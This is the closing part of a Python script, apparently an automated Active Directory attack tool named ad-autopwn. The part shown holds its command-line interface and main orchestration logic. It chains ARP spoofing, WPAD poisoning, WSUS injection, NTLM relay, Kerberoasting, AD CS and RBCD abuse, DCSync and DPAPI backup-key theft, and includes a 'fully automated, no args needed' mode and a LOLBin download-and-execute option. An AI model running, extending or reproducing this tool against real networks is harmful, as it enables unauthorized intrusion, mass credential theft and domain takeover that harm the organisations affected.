
    # SCCM NAA
    sccm_creds = cfg.work_dir / "sccm-naa.txt"
    if sccm_creds.exists() and sccm_creds.stat().st_size > 0:
        stats.append(("🏢 SCCM NAA:", f"{C.BOLD_GREEN}credentials extracted{C.NC}"))

    # Shadow Credentials
    shadow_pfx = list(cfg.work_dir.glob("shadow-*.pfx"))
    if shadow_pfx:
        stats.append(("👤 Shadow creds:", f"{C.BOLD_GREEN}{len(shadow_pfx)} cert(s){C.NC}"))

    # RBCD
    rbcd_tickets = list(cfg.work_dir.glob("rbcd-*.ccache"))
    if rbcd_tickets:
        stats.append(("🎟️  RBCD ticket:", f"{C.BOLD_GREEN}S4U2Proxy succeeded{C.NC}"))

    # DPAPI backup key
    dpapi_key = cfg.work_dir / "dpapi-backupkey.pvk"
    if dpapi_key.exists():
        stats.append(("🔐 DPAPI key:", f"{C.BOLD_YELLOW}backup key extracted{C.NC}"))

    # WebDAV coercion
    webdav_relay = cfg.work_dir / "webdav-relay.txt"
    if webdav_relay.exists() and re.search(r"authenticated|SUCCEED",
                                            webdav_relay.read_text(), re.IGNORECASE):
        stats.append(("🌐 WebDAV:", f"{C.BOLD_GREEN}coercion succeeded{C.NC}"))

    # GPO abuse
    gpo_abuse = cfg.work_dir / "gpo-abuse.txt"
    if gpo_abuse.exists() and re.search(r"created|success", gpo_abuse.read_text(), re.IGNORECASE):
        stats.append(("📋 GPO abuse:", f"{C.BOLD_YELLOW}scheduled task created{C.NC}"))

    cracked = cfg.work_dir / "cracked.txt"
    if cracked.exists() and cracked.stat().st_size > 0:
        count = len(cracked.read_text().strip().splitlines())
        stats.append(("🔓 Cracked:", f"{C.BOLD_GREEN}{count} password(s){C.NC}"))

    comp_count = sum(
        len(f.read_text().strip().splitlines())
        for f in cfg.work_dir.glob("compromised*.txt") if f.exists()
    )
    if comp_count:
        stats.append(("💀 Compromised:", f"{C.BOLD_RED}{comp_count} host(s){C.NC}"))

    dump = cfg.work_dir / "secretsdump.txt"
    if dump.exists() and ":::" in dump.read_text():
        hash_count = dump.read_text().count(":::")
        stats.append(("🗝️  Hashes dumped:", f"{C.BOLD_GREEN}{hash_count} credentials{C.NC}"))
        if "krbtgt:" in dump.read_text():
            stats.append(("👑 Golden ticket:", f"{C.BOLD_YELLOW}krbtgt CAPTURED{C.NC}"))

    for label, value in stats:
        print(f"{C.CYAN}║{C.NC} {label:<20} {value:<42} {C.CYAN}║{C.NC}")

    print(f"{C.CYAN}╠══════════════════════════════════════════════════════╣{C.NC}")

    # Methods
    for wm in sorted(cfg.work_dir.glob("working-method-*.txt")):
        target = wm.stem.replace("working-method-", "")
        method = wm.read_text().strip()
        print(f"{C.CYAN}║{C.NC} ⚔️  {'Exploit:':<18} {C.WHITE}{method} → {target:<20}{C.NC} {C.CYAN}║{C.NC}")

    wc = cfg.work_dir / "working-coercion.txt"
    if wc.exists():
        print(f"{C.CYAN}║{C.NC} 🔨 {'DC coercion:':<18} {C.WHITE}{wc.read_text().strip():<32}{C.NC} {C.CYAN}║{C.NC}")

    print(f"{C.CYAN}╠══════════════════════════════════════════════════════╣{C.NC}")
    print(f"{C.CYAN}║{C.NC} ⏱️  {'Duration:':<18} {C.WHITE}{mins}m {secs}s{'':<25}{C.NC} {C.CYAN}║{C.NC}")
    print(f"{C.CYAN}║{C.NC} 📁 {'Output:':<18} {C.WHITE}{str(cfg.work_dir):<32}{C.NC} {C.CYAN}║{C.NC}")
    print(f"{C.CYAN}║{C.NC} 📋 {'Full log:':<18} {C.WHITE}{str(cfg.work_dir / 'chain.log'):<32}{C.NC} {C.CYAN}║{C.NC}")
    print(f"{C.BOLD_CYAN}╚══════════════════════════════════════════════════════╝{C.NC}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CLI & Main
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def parse_args() -> Config:
    p = argparse.ArgumentParser(
        description="NTLM Relay Attack Chain: zero-auth to domain compromise — Triop AB",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
        Examples:
          # FULLY AUTOMATED — no args needed
          sudo %(prog)s

          # With credentials
          %(prog)s -u jsmith -p 'P@ss123'

          # Pass-the-hash
          %(prog)s -u admin -H aad3b435b51404ee

          # ARP spoof only (zero-auth)
          %(prog)s --phase arp -t 10.0.0.0/24

          # Specific target + interface
          %(prog)s -u jsmith -p 'P@ss' -T 10.0.0.100 -i tun0

          # Dry run
          %(prog)s -u jsmith -p 'P@ss' --dry-run

          # WPAD poisoning (zero-auth)
          %(prog)s --phase wpad

          # WSUS relay + injection (AppLocker bypass)
          %(prog)s --phase wsus --wsus-server 10.0.0.50 --applocker

          # PXE boot credential theft (zero-auth)
          %(prog)s --phase pxe

          # Passive sniff only (recon)
          %(prog)s --phase sniff --sniff-duration 60

          # AppLocker bypass via LOLBin on specific target
          %(prog)s -u jsmith -p 'P@ss' -T 10.0.0.100 --applocker --lolbin mshta --custom-cmd "whoami"
        """),
    )

    creds = p.add_argument_group("Credentials (optional for zero-auth ARP mode)")
    creds.add_argument("-u", "--user", default="", help="Domain username")
    creds.add_argument("-p", "--password", default="", help="Domain password")
    creds.add_argument("-H", "--hash", default="", dest="nthash", help="NT hash (pass-the-hash)")

    net = p.add_argument_group("Network (auto-detected if omitted)")
    net.add_argument("-d", "--domain", default="", help="Target domain")
    net.add_argument("-a", "--attacker-ip", default="", help="Attacker IP")
    net.add_argument("-i", "--iface", default="", help="Network interface")
    net.add_argument("-t", "--target-net", default="", help="Target subnet CIDR")
    net.add_argument("-T", "--target", default="", dest="specific_target", help="Specific target IP")
    net.add_argument("--dc-ip", default="", help="Domain controller IP")
    net.add_argument("--dc-fqdn", default="", help="Domain controller FQDN")
    net.add_argument("--gateway", default="", help="Gateway IP for ARP spoof")

    attack = p.add_argument_group("Attack options")
    attack.add_argument("-m", "--method", default="", help="Coercion method")
    attack.add_argument("--custom-cmd", default="", help="Custom command on target")
    attack.add_argument("-s", "--socks", action="store_true", help="SOCKS proxy mode")
    attack.add_argument("--smb-signing", action="store_true", help="Bypass SMB signing (LDAPS)")
    attack.add_argument("--no-dcsync", action="store_true", help="Skip DC compromise")
    attack.add_argument("--no-cleanup", action="store_true", help="Keep DNS records")
    attack.add_argument("--no-arp", action="store_true", help="Disable ARP spoof fallback")
    attack.add_argument("--batch", action="store_true", help="Exploit all relay targets")
    attack.add_argument("--poison-duration", type=int, default=120, help="ARP spoof timeout (sec)")
    attack.add_argument("--exclude", default="", help="File with IPs to skip")

    wpad_wsus = p.add_argument_group("WPAD / WSUS attacks")
    wpad_wsus.add_argument("--wsus-server", default="", help="WSUS server IP (auto-detected if omitted)")
    wpad_wsus.add_argument("--wsus-port", type=int, default=0, help="WSUS port (default: 8530 HTTP, 8531 HTTPS)")
    wpad_wsus.add_argument("--wsus-https", action="store_true", help="WSUS uses HTTPS (port 8531)")
    wpad_wsus.add_argument("--wsus-certfile", default="", help="TLS cert for WSUS HTTPS interception")
    wpad_wsus.add_argument("--wsus-keyfile", default="", help="TLS key for WSUS HTTPS interception")
    wpad_wsus.add_argument("--no-wpad", action="store_true", help="Skip WPAD poisoning in full auto")
    wpad_wsus.add_argument("--no-wsus", action="store_true", help="Skip WSUS attacks in full auto")
    wpad_wsus.add_argument("--sniff-duration", type=int, default=30,
                           help="Passive sniff duration in seconds (default: 30)")

    applocker_grp = p.add_argument_group("AppLocker bypass")
    applocker_grp.add_argument("--applocker", action="store_true",
                               help="Enable AppLocker bypass: use LOLBins, trusted paths, WSUS signed delivery")
    applocker_grp.add_argument("--lolbin", default="", choices=list(LOLBINS.keys()),
                               help="Specific LOLBin to use (default: auto-select)")
    applocker_grp.add_argument("--payload-url", default="",
                               help="URL of payload for LOLBin download-and-execute")

    adv = p.add_argument_group("Advanced attacks")
    adv.add_argument("--no-adcs", action="store_true", help="Skip AD CS exploitation")
    adv.add_argument("--ca-name", default="", help="Certificate Authority name (auto-detected)")
    adv.add_argument("--esc-victim", default="",
                     help="ESC9/ESC10 UPN-swap victim as USER:PASS (account you have "
                          "WriteProperty on); enables CVE-2022-26923 bypass")
    adv.add_argument("--no-roast", action="store_true", help="Skip Kerberoasting / AS-REP Roasting")
    adv.add_argument("--no-ntlm-theft", action="store_true",
                     help="Skip NTLM theft file drops on writable shares")
    adv.add_argument("--no-sccm", action="store_true", help="Skip SCCM NAA credential theft")
    adv.add_argument("--sccm-server", default="", help="SCCM Management Point (auto-detected)")
    adv.add_argument("--no-shadow-creds", action="store_true",
                     help="Skip shadow credentials (use RBCD instead)")
    adv.add_argument("--no-rbcd", action="store_true", help="Skip RBCD delegation abuse")
    adv.add_argument("--machine-account", default="", help="Pre-created machine account for RBCD")
    adv.add_argument("--machine-password", default="", help="Machine account password for RBCD")
    adv.add_argument("--no-dpapi", action="store_true",
                     help="Skip DPAPI backup key extraction after DCSync")

    run_opts = p.add_argument_group("Execution")
    run_opts.add_argument("--phase", default="full",
                          choices=["full", "enum", "exploit", "dcsync", "arp", "wpad", "wsus",
                                   "pxe", "sniff", "adcs", "roast", "sccm"],
                          help="Run a single phase")
    run_opts.add_argument("--dry-run", action="store_true", help="Print commands only")
    run_opts.add_argument("-v", "--verbose", action="store_true", help="Debug output")
    run_opts.add_argument("-o", "--output", default="", help="Output directory")

    args = p.parse_args()

    cfg = Config(
        username=args.user,
        password=args.password,
        nthash=args.nthash,
        domain=args.domain,
        attacker_ip=args.attacker_ip,
        iface=args.iface,
        gateway=args.gateway,
        target_net=args.target_net,
        specific_target=args.specific_target,
        dc_ip=args.dc_ip,
        dc_fqdn=args.dc_fqdn,
        method=args.method,
        custom_cmd=args.custom_cmd,
        use_socks=args.socks,
        smb_signing=args.smb_signing,
        no_dcsync=args.no_dcsync,
        no_cleanup=args.no_cleanup,
        no_arp=args.no_arp,
        batch=args.batch,
        poison_duration=args.poison_duration,
        wsus_server=args.wsus_server,
        wsus_port=args.wsus_port,
        wsus_https=args.wsus_https,
        wsus_certfile=args.wsus_certfile,
        wsus_keyfile=args.wsus_keyfile,
        no_wpad=args.no_wpad,
        no_wsus=args.no_wsus,
        sniff_duration=args.sniff_duration,
        applocker=args.applocker,
        lolbin=args.lolbin,
        payload_url=args.payload_url,
        no_adcs=args.no_adcs,
        ca_name=args.ca_name,
        esc_victim_user=(args.esc_victim.split(":", 1)[0] if args.esc_victim else ""),
        esc_victim_password=(args.esc_victim.split(":", 1)[1] if ":" in args.esc_victim else ""),
        no_roast=args.no_roast,
        no_ntlm_theft=args.no_ntlm_theft,
        no_sccm=args.no_sccm,
        sccm_server=args.sccm_server,
        no_shadow_creds=args.no_shadow_creds,
        no_rbcd=args.no_rbcd,
        machine_account=args.machine_account,
        machine_password=args.machine_password,
        no_dpapi=args.no_dpapi,
        phase=args.phase,
        dry_run=args.dry_run,
        verbose=args.verbose,
    )

    if args.output:
        cfg.work_dir = Path(args.output)
    else:
        cfg.work_dir = Path(f"./ad-autopwn-{datetime.now():%Y%m%d-%H%M%S}")

    return cfg


def main():
    cfg = parse_args()
    banner()

    if cfg.verbose:
        _console.setLevel(logging.DEBUG)

    if cfg.dry_run:
        log.warning("DRY RUN MODE — commands will be printed but not executed")
        print()

    # Check root for phases that need it
    if os.geteuid() != 0 and cfg.phase in ("full", "arp", "wpad", "wsus", "sniff") and not cfg.dry_run:
        log.error("Root required for network attacks (ARP spoof, packet capture, iptables)")
        log.error("Run with: sudo ad-autopwn " + " ".join(sys.argv[1:]))
        sys.exit(1)
    elif os.geteuid() != 0 and not cfg.dry_run:
        log.warning("Not running as root — network attacks (sniff, ARP, WPAD, WSUS) will be skipped")

    # Setup
    if not check_prerequisites(cfg):
        sys.exit(1)

    # Auto-discover network
    discovery = AutoDiscovery(cfg)
    discovery.run_all()

    # Create work directory + logging
    cfg.work_dir.mkdir(parents=True, exist_ok=True)
    setup_file_logging(cfg.work_dir)
    log.info(f"📁 Output directory: {cfg.work_dir}")

    # Save config
    config_file = cfg.work_dir / "config.txt"
    config_file.write_text(
        f"# ad-autopwn.py v{VERSION}\n"
        f"# Run: {datetime.now()}\n"
        f"# Command: {' '.join(sys.argv)}\n\n"
        f"Domain:     {cfg.domain}\n"
        f"User:       {cfg.username}\n"
        f"Auth:       {'NT hash' if cfg.nthash else 'password' if cfg.password else 'none (ARP)'}\n"
        f"Attacker:   {cfg.attacker_ip} ({cfg.iface})\n"
        f"Gateway:    {cfg.gateway}\n"
        f"DC IP:      {cfg.dc_ip}\n"
        f"DC FQDN:    {cfg.dc_fqdn}\n"
        f"Target net: {cfg.target_net or 'N/A'}\n"
        f"Target:     {cfg.specific_target or 'auto'}\n"
        f"Phase:      {cfg.phase}\n"
    )

    # Signal handler for cleanup
    def handle_signal(sig, frame):
        print(f"\n{C.YELLOW}⚠️  Interrupted — cleaning up...{C.NC}")
        cfg.cleanup()
        sys.exit(130)

    signal.signal(signal.SIGINT, handle_signal)
    signal.signal(signal.SIGTERM, handle_signal)

    try:
        # ---- No creds? Full auto: ARP/WPAD/WSUS → crack → exploit → DCSync ----
        # ---- Passive sniff only ----
        if cfg.phase == "sniff":
            passive_sniff(cfg, duration=cfg.sniff_duration)
            print_summary(cfg)
            return

        # ---- No creds? Full auto: ARP/WPAD/WSUS → crack → exploit → DCSync ----
        if not cfg.has_creds and cfg.phase in ("full", "arp", "wpad", "wsus", "pxe"):
            if cfg.phase == "arp":
                run_arp_capture(cfg)
            elif cfg.phase == "wpad":
                run_wpad_attack(cfg)
                extract_hashes(cfg)
                try_crack_hashes(cfg)
            elif cfg.phase == "wsus":
                if run_wsus_relay(cfg):
                    extract_hashes(cfg)
                    try_crack_hashes(cfg)
                if cfg.wsus_server or detect_wsus_server(cfg):
                    run_wsus_inject(cfg)
            elif cfg.phase == "pxe":
                run_pxe_attack(cfg)
            else:
                run_full_auto(cfg)
            cleanup_dns_records(cfg)
            print_summary(cfg)
            return

        # ---- Authenticated attack phases ----
        match cfg.phase:
            case "enum":
                enumerate_targets(cfg)

            case "exploit":
                if cfg.specific_target:
                    exploit_target(cfg.specific_target, cfg)
                else:
                    relay_targets, _ = enumerate_targets(cfg)
                    if cfg.batch:
                        run_batch(relay_targets, cfg)
                    elif relay_targets:
                        ok(f"Auto-selected target: {relay_targets[0]}")
                        exploit_target(relay_targets[0], cfg)

            case "dcsync":
                if not cfg.specific_target:
                    log.error("--phase dcsync requires --target")
                    sys.exit(1)
                dcsync_attack(cfg.specific_target, cfg)

            case "arp":
                run_arp_capture(cfg)

            case "wpad":
                run_wpad_attack(cfg)
                extract_hashes(cfg)
                try_crack_hashes(cfg)

            case "wsus":
                if run_wsus_relay(cfg):
                    extract_hashes(cfg)
                    try_crack_hashes(cfg)
                if cfg.wsus_server or detect_wsus_server(cfg):
                    run_wsus_inject(cfg)

            case "pxe":
                run_pxe_attack(cfg)

            case "adcs":
                if not cfg.has_creds:
                    log.error("--phase adcs requires credentials (-u/-p)")
                    sys.exit(1)
                run_adcs_attack(cfg)

            case "roast":
                if not cfg.has_creds:
                    log.error("--phase roast requires credentials (-u/-p)")
                    sys.exit(1)
                run_roast_attack(cfg)

            case "sccm":
                if not cfg.has_creds:
                    log.error("--phase sccm requires credentials (-u/-p)")
                    sys.exit(1)
                run_sccm_attack(cfg)

            case "full":
                # Run new authenticated attacks before exploitation
                if not cfg.no_roast:
                    run_roast_attack(cfg)
                if not cfg.no_adcs and tool_exists("certipy"):
                    run_adcs_attack(cfg)
                if not cfg.no_sccm:
                    run_sccm_attack(cfg)

                if cfg.specific_target:
                    if cfg.applocker and cfg.custom_cmd:
                        cfg.custom_cmd = _build_applocker_cmd(cfg)
                    exploit_target(cfg.specific_target, cfg)
                    if not cfg.no_dcsync:
                        dcsync_attack(cfg.specific_target, cfg)
                else:
                    relay_targets, _ = enumerate_targets(cfg)

                    best = ""
                    hv = cfg.work_dir / "high-value-targets.txt"
                    if hv.exists():
                        best = _first_line(hv.read_text())
                    if best:
                        ok(f"🎯 Auto-selected HIGH VALUE target: {best}")
                    elif relay_targets:
                        best = relay_targets[0]
                        ok(f"Auto-selected target: {best}")

                    if cfg.batch and relay_targets:
                        run_batch(relay_targets, cfg)
                    elif best:
                        if cfg.applocker and cfg.custom_cmd:
                            cfg.custom_cmd = _build_applocker_cmd(cfg)
                        exploit_target(best, cfg)

                    # WebDAV coercion — try if standard exploit didn't work or no relay targets
                    if not best or not relay_targets:
                        webclient_hosts = detect_webclient_hosts(cfg)
                        for wh in webclient_hosts:
                            if run_webdav_coercion(wh, cfg):
                                break

                    # DHCP coercion — additional relay path
                    run_dhcp_coercion(cfg)

                    # GPO abuse — if we have write access to any GPO
                    run_gpo_abuse(cfg)

                    # WSUS injection if available (AppLocker bypass)
                    if not cfg.no_wsus and cfg.wsus_server:
                        run_wsus_inject(cfg)

                    if not cfg.no_dcsync and best:
                        dcsync_attack(best, cfg)

                # DPAPI extraction after DCSync
                if not cfg.no_dpapi:
                    run_dpapi_backup(cfg)

        cleanup_dns_records(cfg)
        print_summary(cfg)

    finally:
        cfg.cleanup()


if __name__ == "__main__":
    main()
